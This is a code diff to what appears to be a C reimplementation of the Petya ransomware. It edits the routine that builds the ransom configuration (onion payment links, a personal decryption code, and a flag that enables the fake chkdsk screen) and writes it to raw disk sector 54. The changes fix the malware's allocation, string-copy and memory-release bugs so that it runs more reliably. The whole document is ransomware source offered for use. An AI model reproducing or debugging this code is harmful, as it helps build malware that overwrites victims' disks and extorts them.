@@ -178,15 +178,22 @@ PetyaConfigurationSector(
 
 
 	//Really unoptimized but whatever the fuck.
-	PCHAR FirstLink = ( PCHAR )VirtualAlloc( 0, sizeof( Dawger->FirstLink ), // this should use strlen smh
+	PCHAR FirstLink = ( PCHAR )VirtualAlloc( 0, sizeof( Dawger->FirstLink ) + 1, // this should use strlen smh
 												MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
-	PCHAR SecondLink = ( PCHAR )VirtualAlloc( 0, sizeof( Dawger->SecondLink ),
+	PCHAR SecondLink = ( PCHAR )VirtualAlloc( 0, sizeof( Dawger->SecondLink ) + 1,
 												MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
-	PCHAR PersonalDecryptionCode = ( PCHAR )VirtualAlloc( 0, sizeof( Dawger->PersonalDecryptionCode ),
+	PCHAR PersonalDecryptionCode = ( PCHAR )VirtualAlloc( 0, sizeof( Dawger->PersonalDecryptionCode ) + 1,
 												MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
-	FirstLink = "http://petyaxxxxxxxxxxx.onion/xxxxxx";
-	SecondLink = "http://petyaxxxxxxxxxxx.onion/xxxxxx";
-	PersonalDecryptionCode = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+	
+	if ( !FirstLink || !SecondLink || !PersonalDecryptionCode || !Dawger )
+	{
+		MessageBox( 0, "Allocation failed!", "Error", 0 );
+		return;
+	}
+
+	strcpy( FirstLink, "http://petyaxxxxxxxxxxx.onion/xxxxxx" );
+	strcpy( SecondLink, "http://petyaxxxxxxxxxxx.onion/xxxxxx");
+	strcpy( PersonalDecryptionCode, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
 
 	Dawger->Encrypted = 0x00; //Enable fake chkdsk
 
@@ -221,16 +228,14 @@ PetyaConfigurationSector(
 	RtlCopyMemory( &Dawger->PersonalDecryptionCode, PersonalDecryptionCode, sizeof( Dawger->PersonalDecryptionCode ) );
 
 
-	PCHAR WriteWith = ( PCHAR )Dawger; //Cast the drill
-	PetyaWriteSector( hHard, 54, WriteWith, 512); //Set the configuration
+	PetyaWriteSector( hHard, 54, Dawger, 512); //Set the configuration
 
 
-	//this really hurts my brain whatever
-	VirtualFree( FirstLink, sizeof( FirstLink ), MEM_RELEASE ); //should've been freed with strlen
-	VirtualFree( SecondLink, sizeof( SecondLink ), MEM_RELEASE );
-	VirtualFree( PersonalDecryptionCode, sizeof( PersonalDecryptionCode ), MEM_RELEASE );
+	VirtualFree( FirstLink, 0, MEM_RELEASE );
+	VirtualFree( SecondLink, 0, MEM_RELEASE );
+	VirtualFree( PersonalDecryptionCode, 0, MEM_RELEASE );
 
-	VirtualFree( Dawger, sizeof( Dawger ), MEM_RELEASE );
+	VirtualFree( Dawger, 0, MEM_RELEASE );
 
 
 }
